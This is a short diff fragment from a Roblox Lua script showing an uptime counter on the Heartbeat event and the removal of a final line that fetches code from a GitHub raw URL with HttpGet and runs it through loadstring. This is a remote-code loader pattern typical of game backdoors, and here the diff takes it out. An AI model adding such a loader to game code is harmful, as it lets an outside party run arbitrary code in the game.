@@ -289,4 +289,3 @@ RunService.Heartbeat:Connect(function()
     end
     uptimeSeconds = uptimeSeconds + 1
 end)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/gitolan/gefop-/main/gefsetdamage"))()
